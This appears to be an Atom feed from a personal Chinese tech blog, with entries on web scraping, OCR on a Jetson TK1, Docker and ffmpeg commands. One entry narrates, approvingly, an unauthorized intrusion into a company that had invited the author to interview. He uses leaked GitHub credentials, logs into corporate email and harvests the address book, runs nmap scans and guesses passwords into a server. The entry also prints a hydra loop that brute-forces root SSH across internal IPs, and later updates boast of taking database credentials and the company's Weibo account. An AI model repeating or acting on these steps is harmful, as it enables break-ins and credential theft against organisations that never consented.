&#125;;</span><br><span class="line"></span><br><span class="line">request(options, <span class="function"><span class="keyword">function</span> (<span class="params">error, response, body</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(error);</span><br><span class="line">  <span class="built_in">console</span>.log(body);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>不过可以从这里面看出来一个东西，就是模拟微信只需要在<code>user-Agent</code>里面加上<code>MicroMessenger</code> </p><p><img src="/images//user-Agent.jpg" alt="User-agent"></p><p>其实呢，你可以看到，里面之所以加了不同的浏览器版本，其实就是为了兼容(图片来自第一次在这里的技术分享%&gt;_&lt;%)。</p><p>Other:</p><p>后来，在尝试在hadoop上跑爬虫，又想到了一种的途径去获得连接并且去重，类似这样。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">lynx --dump -listonly http://qichahca.com | grep "[http|https]://" | awk '!a[$2]++'</span><br></pre></td></tr></table></figure><p>也可以grep的时候，只匹配特定域名下的东西。</p><p>后记:</p><p>突然发现自己写的爬虫，可能算不上爬虫，我是习惯性的找到数据接口，API也好，找到规律也好，然后获取所有数据。这样的缺点是需要前面投入一些时间去分析。然后就简单了。 而我通过近期对公司分布式爬虫代码的阅读来看，或者说平常的代码来看，一旦页面变化，就需要修改对应的代码，一直都需要人来维护。但是API的就不会。同时，同样的请求，不需要请求其他无用的html内容。</p><p>虽然自己也能写正常的爬虫，但是对于分布式爬虫还是有点不行。最近在看本司分布式爬虫的代码。设计什么的还好理解，架构也好理解。但是吧，代码没文档，真是丑。决定试试分布式爬虫框架以及大型爬虫在hadoop上怎么搞的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;企查查相关&quot;&gt;&lt;a href=&quot;#企查查相关&quot; class=&quot;headerlink&quot; title=&quot;企查查相关&quot;&gt;&lt;/a&gt;企查查相关&lt;/h3&gt;&lt;p&gt;来这里的第一份小任务是获取自动登录企查查后的cookie,本来是打算&lt;/p&gt;
&lt;figure class=&quot;high
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="抓取数据" scheme="http://iami.xyz/tags/%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE/"/>
    
      <category term="实习笔记" scheme="http://iami.xyz/tags/%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>浅谈OCR在Jeston TK1上的产品化两种解决方案</title>
    <link href="http://iami.xyz/2016/11/22/Ocr-Jeston-Tk1-In/"/>
    <id>http://iami.xyz/2016/11/22/Ocr-Jeston-Tk1-In/</id>
    <published>2016-11-21T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一直关注Video++这家公司。自从看到了在招OCR算法工程师，并负责评估TK1上的产品化。恰好毕业设计在做Tk1上的文本识别(算是体会到水了)，就勉强写一下吧。我感觉这个做出来的东西肯定不太便宜，个人不一定玩的起。</p><p>如我所理解，机器学习只是数据挖掘的一种方法，而数据挖掘最终目的也是在某一个领域内或者多个领域内进行迁移，得到相应的解决方法。因此在在做Robocup 3d simulation 的时候就有意识的往上面应用一些方法，当然我最大的心愿就是Use ML With Penetration. 相信未来安全领域和AI领域以及各种机器人一定一片沃土。</p></blockquote><p>首先：拆掉风扇，风扇这个东西吧，噪音太大，必须拆掉。因为热的并不是很大到不可接受。</p><p>两种方案</p><ul><li>A: Tesseract</li></ul><blockquote><p> <a href="http://tesseract.projectnaptha.com/" target="_blank" rel="noopener">Tesseract.js</a> + <a href="http://gpu.rocks/" target="_blank" rel="noopener">gpu.js</a></p><p>Tesseract是一款众所周知的开源OCR，但是Tesseract.js可能知道的就不多了，但是他的github的star数比Tesseract多了不少吧。纯浏览器端加载，也可以npm导入作为后端调用。使用简单，效率不凡。由于提到了说要利用GPU的计算能力，初步以为使用gpu.js重写数据结构和计算部分。</p></blockquote><ul><li>B: DeepLearning with <a href="http://caffe.berkeleyvision.org/" target="_blank" rel="noopener">Caffe</a></li></ul><blockquote><p> 这个思路简单，类似交叉编译。就是在自己的机器上把模型训练好，<font color="green">安装GPU模式的caffe到Jeston Tk1 </font>, 然后写代码<font color="green">调用训练好模型</font>处理现在的数据进行OCR即可。</p><blockquote><ul><li>问题1: Jeston Tk1上的caffe安装耗时耗利，且cudnn的版本会导致不能启用GPU模式。<br>解决方案: docker 部署，直接pull下来docker hub上封装好的GPU模式的caffe。这样对产品化，量产有了一定的保障。但其实Tk1的刷机也比较麻烦，对网络环境的要求是自由的，安装过程中，出现依赖有时候还需要手动安装。</li></ul><ul><li>问题2：Jeston Tk1上的docker安装(docker.io ,docker-engine)，docker安装成功之后daemon进程无法启动，始终无法启动。<br>解决方案:未知，issued(目前由于信息不完善被关闭了，等在这边安定之后，try again)</li></ul><ul><li>问题3：汉字不同英文，需要收集的数据集太大。而且数据有需要精准标注，耗费人力物力巨大。且由于不同的书法体，楷体，行楷，隶书等”规矩”的字体还好说，但是向草书，笔走龙蛇之势，普通人都难以辨别，尚需书法家，何况机器。<br>解决: 未知，不过这个属于算法部分。</li></ul></blockquote></blockquote><p>最后的最后， 回家三天停电两天，不得不服。另相遇海知，十分开心。</p><p>综上:不敢妄下断言。可行度大概七八成。但是考虑到部署和板子本身的成本问题批量生产其实并不乐观。一块板子一千六左右。</p><font color="red">update 2016/12/12:</font><p>从github上跑的一个<a href="https://github.com/pannous/caffe-ocr" target="_blank" rel="noopener">caffe-ocr</a>，其中会有一部分是不存在的文件，只要删除掉，基本就行了。<br>可行性还是很高的。印刷体的话基本上是没什么挑战性的。中文的有一个数据集 CAISA-HWDB。来上海的这些天，突然觉得上海的消费水平，相对于这里的生活水平其实这个板子也是便宜的可以了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#delete TimesNewRoman-10-4.png TimesNewRoman-10-3.png imesNewRoman-10-1.png TimesNewRoman-10-5.png TimesNewRoman-10-2 TimesNewRoman-6-1.png</span></span><br><span class="line">$   sed -i <span class="string">'/TimesNewRoman-10-5.png/d'</span> `ls | grep _index`</span><br><span class="line">$ sed -i <span class="string">'s/GPU/CPU/g'</span> alpha_solver.prototxt <span class="comment">#我的是CPU模式的，看你自己的情况</span></span><br><span class="line">$   caffe train -solver alpha_solver.prototxt</span><br></pre></td></tr></table></figure><p><img src="/images//caffe-ocr.jpg" alt="caffe-ocr"> </p><p>other: Docker说是不支持armhf的，所以如果安装caffe的话还是需要手动安装。<br>但是不一定局限于caffe，可以安装Tensorflow，Theano.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;一直关注Video++这家公司。自从看到了在招OCR算法工程师，并负责评估TK1上的产品化。恰好毕业设计在做Tk1上的文本识别(算是体会到水了)，就勉强写一下吧。我感觉这个做出来的东西肯定不太便宜，个人不一定玩的起。&lt;/p&gt;
&lt;p&gt;如我所理解，机器
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Docker for daily use</title>
    <link href="http://iami.xyz/2016/11/13/Docker-useage/"/>
    <id>http://iami.xyz/2016/11/13/Docker-useage/</id>
    <published>2016-11-12T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -i -t --name alias_container_name images_name </span><br><span class="line">$ docker attach container_id</span><br></pre></td></tr></table></figure><h3 id="someUser-don’t-need-root"><a href="#someUser-don’t-need-root" class="headerlink" title="someUser don’t need root"></a>someUser don’t need root</h3><p><code>sudo usermod -aG docker someUser</code></p><h3 id="stop-docker-container"><a href="#stop-docker-container" class="headerlink" title="stop docker container"></a>stop docker container</h3><p><code>$ docker stop container_id</code></p><h3 id="export-single-file-from-runing-container"><a href="#export-single-file-from-runing-container" class="headerlink" title="export single file from runing container"></a>export single file from runing container</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker cp name.txt container_name:/name.txt</span><br><span class="line">$ docker cp container_name:/name.txt name.txt</span><br></pre></td></tr></table></figure><h3 id="delete-force-or-not"><a href="#delete-force-or-not" class="headerlink" title="delete force or not"></a>delete force or not</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker rm container</span><br><span class="line">$ docker rmi images</span><br><span class="line">$ dcoker rmi -f images | docker rm -f container_id</span><br></pre></td></tr></table></figure><h3 id="remove-all-stoped-container"><a href="#remove-all-stoped-container" class="headerlink" title="remove all stoped container"></a>remove all stoped container</h3><p><code>$ docker rm $(docker ps -a -q)</code></p><h3 id="kill-containers-and-remove-them"><a href="#kill-containers-and-remove-them" class="headerlink" title="kill containers and remove them:"></a>kill containers and remove them:</h3><p><code>$ docker rm $(docker kill $(docker ps -aq))</code></p><h3 id="remove-all-images"><a href="#remove-all-images" class="headerlink" title="remove all images"></a>remove all images</h3><p><code>$ docker rmi $(docker images -qf &quot;dangling=true&quot;)</code></p><p><code>docker rmi $(docker images | grep -v &#39;ubuntu\|my-image&#39; | awk {&#39;print $3&#39;})</code></p><h3 id="mount-the-directory-to-docker"><a href="#mount-the-directory-to-docker" class="headerlink" title="mount the directory to docker"></a>mount the directory to docker</h3><p><code>$ docker run -d P --name mnistDemo -v .:/mnistDemo caffe:latest /bin/bash</code></p><h3 id="link-container"><a href="#link-container" class="headerlink" title="link container"></a>link container</h3><p><code>docker run -i -t --name container1 --net=my-network --net-alias=container1 ubuntu:trusty /bin/bash</code></p><h3 id="docker-expose-port"><a href="#docker-expose-port" class="headerlink" title="docker expose  port"></a>docker expose  port</h3><p><code>$ docker run -d -p 80:80 my_image service nginx start</code></p><p>References:</p><ul><li><p><a href="http://stackoverflow.com/questions/16047306/how-is-docker-different-from-a-normal-virtual-machine" target="_blank" rel="noopener">how-is-docker-different-from-a-normal-virtual-machine</a></p></li><li><p><a href="http://stackoverflow.com/questions/21871479/docker-cant-connect-to-docker-daemon" target="_blank" rel="noopener">docker-cant-connect-to-docker-daemon</a></p></li><li><p><a href="http://stackoverflow.com/questions/25324860/how-to-create-a-bidirectional-link-between-containers" target="_blank" rel="noopener">how-to-create-a-bidirectional-link-between-containers</a></p></li><li><p><a href="https://docs.docker.com/engine/reference/commandline/build/" target="_blank" rel="noopener">docker build</a></p></li><li><p><a href="https://docs.docker.com/engine/reference/commandline/commit/" target="_blank" rel="noopener">docker commit</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="学习笔记" scheme="http://iami.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>实习之登堂入室</title>
    <link href="http://iami.xyz/2016/11/09/Get-all-server/"/>
    <id>http://iami.xyz/2016/11/09/Get-all-server/</id>
    <published>2016-11-08T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<h1 id="但行好事，莫问前程"><a href="#但行好事，莫问前程" class="headerlink" title="但行好事，莫问前程"></a>但行好事，莫问前程</h1><blockquote><p>解决方案</p></blockquote><ul><li><font color="red"> 删除Github上的敏感配置信息(包括但不限于微信Appkey,secert,Email账号，mlab上的DB配置，产品AppKey,Secert, ELK服务器账号密码等信息且不只是一个配置文件中出现)或着撤下Github上所有的公司产品代码 </font></li><li><font color="red">更改邮箱密码为复杂密码(但不止包括邮箱，其他可被搜索并和公司相关联的其他平台账号)，更改服务器为无规律密码(而非公司名加服务器功能加ip前几位构成)，</font></li><li><font color="red">更新数据库中已经暴露的数据。</font></li><li><font color="red">加强服务器配置，例如防SSH爆破，适当清理bash的history，设置白名单访问等</font></li><li><font color="red"> 重要信息不可放置到外网上。</font></li></ul><h4 id="这是一次找实习之余，偶然接到这家公司的面试。出于对目标公司的好奇。当然只是作为对所中意公司的了解-之前是一点也不了解-，进行了小小的测试。目前所有已测试数据均已删除。不过经过此次测试发现越来越喜欢这家公司了。"><a href="#这是一次找实习之余，偶然接到这家公司的面试。出于对目标公司的好奇。当然只是作为对所中意公司的了解-之前是一点也不了解-，进行了小小的测试。目前所有已测试数据均已删除。不过经过此次测试发现越来越喜欢这家公司了。" class="headerlink" title="这是一次找实习之余，偶然接到这家公司的面试。出于对目标公司的好奇。当然只是作为对所中意公司的了解(之前是一点也不了解)，进行了小小的测试。目前所有已测试数据均已删除。不过经过此次测试发现越来越喜欢这家公司了。"></a>这是一次找实习之余，偶然接到这家公司的面试。出于对目标公司的好奇。当然只是作为对所中意公司的了解(之前是一点也不了解)，进行了小小的测试。目前所有已测试数据均已删除。不过经过此次测试发现越来越喜欢这家公司了。</h4><p>1.故事的开始。</p><p>去官网看了一下，发现没有什么实质性的内容，而且不给注册。。好坑，不开心。而且只能从微信体验公司宣传的功能。于是抓包，看到API，猜了几次。觉得十分有趣。后来就去搜索引擎 <code>site:target.com</code> 不出意外发现了其他的相关域名。而且测试版的网站竟然还没下线(允许注册登录)。在这个网站注册了账号，尝试了一下基本功能，算是有了初步的了解。不过发现一个很不好的地方，就是API的设计，基本上全是用的GET，从后台取数据的时候，URL上一大串参数。而根据REST设计风格来看，其实这几个功能都应该是通过POST的方式，并且将请求的数据放到Body里比较好。 </p><p>2.Github上的数据泄露</p><p>一边从搜索引擎得到网站一些信息，然后去github尝试了一下，看看有没有人上传过代码。不尝试不知道，发现信息泄露十分严重。数个员工均在github上公开了代码。其中配置文件包括服务器，企业邮箱，db，ELK信息等。<br>拿出旁注工具，旁注得到域名<br><img src="/images//hackit/pangzhu_1.jpg" alt="旁注得到域名"></p><p>同时登录企业邮箱，邮箱中并无重要信息。但是Get到了部分通讯录。有了通讯录就方便了很多。通讯录是Json格式的，看起来很费事，所以转成csv好点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;key = $1; $1 = ""; a[key] = a[key] $0&#125; END &#123; for (key in a) print key, a[key] &#125;' &lt;&lt;&lt; cat tt.txt  &gt;tempfile   #直接合并数据</span><br><span class="line">sed -n '2,6p' tempfile#取第姓名行到第邮箱行</span><br><span class="line">sed '2,3d' tempfile#删除姓名到邮箱中的多余的二行。</span><br><span class="line">cat tempfile | sed 's/,/\n/g'#以逗号进行的行列转置，但是转置之后全部变成一列了</span><br><span class="line">paste name.txt mail.txt  | awk '&#123;printf "%s %s %s \n", $1 ,",",$2 &#125;' &gt; ConnectInfo.csv #两个不同的文件合并成两列到一个文件  #</span><br></pre></td></tr></table></figure><p>其实还可以用csvkit，csvkit的话一行命令就行了就<code>json2csv xx.json xx.csv</code>可以转成csv格式了。</p><p>而另一边旁注得到的信息需要进行一下整理，看看是不是有多个站点共同使用一个IP上的。不同工具不同字典大小，可以得到不同的结果。</p><blockquote><p>使用<br><code>awk &#39;{key = $1; $1 = &quot;&quot;; a[key] = a[key] $0} END { for (key in a) print key, a[key] }&#39; &lt;&lt;&lt; cat IpInfo.txt</code></p></blockquote><p>得到整理好的数据，可以看到有三个ip上同时每个上面部署了两个站点。当然后来换了个字典，发现其实不止这么多二级域名，一共有16个的样子吧。<br><img src="/images//hackit/pangzhu_2.jpg" alt="整理数据"></p><p>这边得到了iplist就应该开始进行扫描了。使用 <code>nmap -A -Pn -iL IPlist.txt &gt; IPScanresult.txt</code> 同时还有一个进行URL的扫描。当然这个时候我还在搜索信息。发现其使用一个XX部落，通过密码猜测进入。然后发现一个十分重要的东西。就是内网映射服务器的账号密码在那记载着呢。</p><p><img src="/images//hackit/RUKOUVPS.png" alt="进来了"><br>进来之后发现其实还部署着docker，nginx，ELK等服务，但是这台服务器的性能上是真一般，而且网速超级慢。</p><p>3.服务器之上</p><blockquote><p>进了服务器，开始看一下路由表映射，然后查看历史记录，在整个目录下递归搜索含有’pwd’,’password’,’xxx’的文件。查看历史记录发现<code>grep -rnw /home/ -e &#39;pwd&#39;</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">iplist="10.10.241.52</span><br><span class="line">10.10.177.183</span><br><span class="line">10.10.241.52</span><br><span class="line">10.10.177.183</span><br><span class="line">10.10.255.95</span><br><span class="line">10.10.239.183</span><br><span class="line">172.17.0.2</span><br><span class="line">10.10.255.1</span><br><span class="line">172.17.0.2</span><br><span class="line">10.10.255.1</span><br><span class="line">10.10.220.103</span><br><span class="line">10.10.255.92</span><br><span class="line">10.10.200.143</span><br><span class="line">10.10.166.86</span><br><span class="line">10.10.255.93</span><br><span class="line">10.10.84.141</span><br><span class="line">10.10.200.122</span><br><span class="line">10.10.0.1</span><br><span class="line">10.10.255.90</span><br><span class="line">10.10.200.4</span><br><span class="line">10.10.255.2</span><br><span class="line">10.10.255.200</span><br><span class="line">10.10.255.250</span><br><span class="line">10.10.232.79"</span><br><span class="line"> </span><br><span class="line">echo "===Begin TEST==="</span><br><span class="line">for ip in $iplist;</span><br><span class="line">do</span><br><span class="line">          hydra $ip -s 50001 ssh -l root -P passlist.txt</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>OVER_by_2016_11_12</p><p>现在是第二天早上11点(周日)：刚写完邮件通知对方。</p><p>ps:其他过程不想写了，昨天搞到将近两点，本来还打算看看面试题呢。不过也没什么可看的。哎，通知了对方。有的人说不要，有的人说要。还是，但行好事，莫问前程。希望ok。</p><p><img src="/images//hackit/attention.jpg" alt="通知对方"></p><p>ps2:前几天和堂姐聊天，说要辞实习，重新找一份。姐说：年轻人就是好。是啊，年轻，棱角未平，阳光正好。现在我又佩服我的老姐了，能拿下全马，佩服你。</p><p>update:14号上午，还是不想看面试题。昨天发邮件通知之后，也没人回复个谢谢。邮箱密码虽然改了，但服务器还是没有修改。这次又测到4个DB服务器的账号密码。</p><p><img src="/images//hackit/msg1.jpg" alt="DBMSG"></p><p>问了下HR面试我的面试官名字，找到之后，微博,github,知乎。发现我们两个的学习路线差不多。不知道今天下午的面试会怎么样？OK,嘿嘿。<br>update:14号上午11:00，好吧官方微博账号到手。</p><p><img src="/images//hackit/weibo.png" alt="weibohh"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;但行好事，莫问前程&quot;&gt;&lt;a href=&quot;#但行好事，莫问前程&quot; class=&quot;headerlink&quot; title=&quot;但行好事，莫问前程&quot;&gt;&lt;/a&gt;但行好事，莫问前程&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;解决方案&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;
      
    
    </summary>
    
      <category term="HowTo" scheme="http://iami.xyz/categories/HowTo/"/>
    
    
      <category term="实习笔记" scheme="http://iami.xyz/tags/%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ffmpeg Simpley Useage</title>
    <link href="http://iami.xyz/2016/11/01/Image-Parse/"/>
    <id>http://iami.xyz/2016/11/01/Image-Parse/</id>
    <published>2016-10-31T16:00:00.000Z</published>
    <updated>2018-01-12T02:06:41.705Z</updated>
    
    <content type="html"><![CDATA[<p>###前几天公司的人去北京参加一个视频搜索的比赛，然后发回来组委对数据处理的要求</p><p><img src="/images//imageParser.jpg" alt="imageParser"></p><ul><li>画中画</li></ul><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -y -i o_oC.mp4 -i y1.MP4 \</span><br><span class="line">-strict experimental \</span><br><span class="line">-filter_complex \</span><br><span class="line">"[1:a] atrim=15:30,adelay=5000|5000 [a1]; \</span><br><span class="line">[0:a][a1] amix [outa]; \</span><br><span class="line">[1:v] scale=120:-1,setpts=PTS-(10/TB) [1v]; \</span><br><span class="line">[0:v][1v] overlay=x=250:y=250:enable='between(t,5,200)'[outv]" \</span><br><span class="line">-map "[outv]" -map "[outa]" \</span><br><span class="line">-c:a aac -c:v libx264 \</span><br><span class="line">-b:v 1000k \</span><br><span class="line">-r 24 \</span><br><span class="line">output.mp4</span><br></pre></td></tr></table></figure></blockquote><ul><li>视频增加中图片</li></ul><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i y1.MP4 -i image.jpg \</span><br><span class="line">-filter_complex "[0:v][1:v] overlay=25:25:enable='between(t,0,2)'" \</span><br><span class="line">-pix_fmt yuv420p -c:a copy \</span><br><span class="line">addImage.mp4</span><br></pre></td></tr></table></figure><p>可以通过修改between达到插入一段时间或者1秒,scale可以用来控制插入前后的比例。overlay的x,y分别是距离左上角的偏移量。-strict experimental和-strict -2的效果相同，但必须紧跟在-i选项之后，否则报错。</p></blockquote><ul><li>视频压缩</li></ul><blockquote><p><code>ffmpeg -i y2.MP4 -acodec mp2 --psnr 1 compress.mp4</code><br>之前对官网做性能优化的时候，把mp4转webm也能降低视频大小，但是视频压缩并不一定降低视频大小。</p></blockquote><ul><li>Gamma变换</li></ul><blockquote><p><code>ffmpeg -i y1.MP4 -strict -2 -vf &quot;eq=gamma=0.5&quot; gammaChange.mp4</code></p></blockquote><ul><li>增加白噪音</li></ul><blockquote><p><code>ffmpeg -i y7.MP4 -strict -2 -filter_complex &quot;aevalsrc=-2+random(0)&quot; noise.mp4</code></p></blockquote><ul><li>丢帧</li></ul><blockquote><p><code>avconv -r 24 -i src.mov -an -vf fps=fps=12 output.mov</code></p></blockquote><ul><li>增加字幕</li></ul><blockquote><p><code>ffmpeg -i y1.MP4 -f srt -i a.srt -c:v copy -c:a copy -c:s mov_text addSrt.mp4</code></p></blockquote><ul><li>Reference Cut picture in Video</li></ul><blockquote><p><code>ffmpeg -ss [start] -i in.mp4 -t [duration] -c copy out.mp4</code></p></blockquote><font color="green"> Update:2017.06.16  </font><ul><li>取3,5秒的视屏转化为gif图片</li></ul><blockquote><p><code>ffmpeg -v warning -ss 3 -t 5 -i input.wmv -vf scale=3000:-1 -gifflags +transdiff -y sample.gif</code></p></blockquote><p>###Other</p><p>下面链接所附，只做参考，部分命令不能使用。以上所有列出代码，均自己使用过的。PS:总是说有时间有时间，其实，我不知道啊。。啊，我的毕设毕设。还有我给你定的拖拉那么多的事情。</p><p>###Resources</p><ul><li><a href="http://stackoverflow.com/questions/4010832/ffmpeg-compress-video" target="_blank" rel="noopener">ffmpeg-compress-video</a></li><li><a href="http://stackoverflow.com/questions/8672809/use-ffmpeg-to-add-text-subtitles" target="_blank" rel="noopener">use-ffmpeg-to-add-text-subtitles</a></li><li><a href="http://superuser.com/questions/377343/cut-part-from-video-file-from-start-position-to-end-position-with-ffmpeg" target="_blank" rel="noopener">cut-part-from-video-file</a></li><li><a href="http://stackoverflow.com/questions/15792105/simulating-tv-noise" target="_blank" rel="noopener">simulating-tv-noise</a></li><li><a href="http://stackoverflow.com/questions/2553448/encode-video-in-reverse" target="_blank" rel="noopener">encode-video-in-reverse</a></li><li><a href="http://superuser.com/questions/849739/how-do-i-reduce-frame-rate-without-increasing-duration" target="_blank" rel="noopener">reduce-frame</a></li><li><a href="https://en.wikibooks.org/wiki/FFMPEG_An_Intermediate_Guide/image_sequence" target="_blank" rel="noopener">image_sequence</a></li><li><a href="http://blog.pkh.me/p/21-high-quality-gif-with-ffmpeg.html" target="_blank" rel="noopener">video_convert_image</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###前几天公司的人去北京参加一个视频搜索的比赛，然后发回来组委对数据处理的要求&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images//imageParser.jpg&quot; alt=&quot;imageParser&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;画中画&lt;/li&gt;
&lt;/ul&gt;
&lt;block
      
    
    </summary>
    
      <category term="全栈工程师" scheme="http://iami.xyz/categories/%E5%85%A8%E6%A0%88%E5%B7%A5%E7%A8%8B%E5%B8%88/"/>
    
    
      <category term="实习笔记" scheme="http://iami.xyz/tags/%E5%AE%9E%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
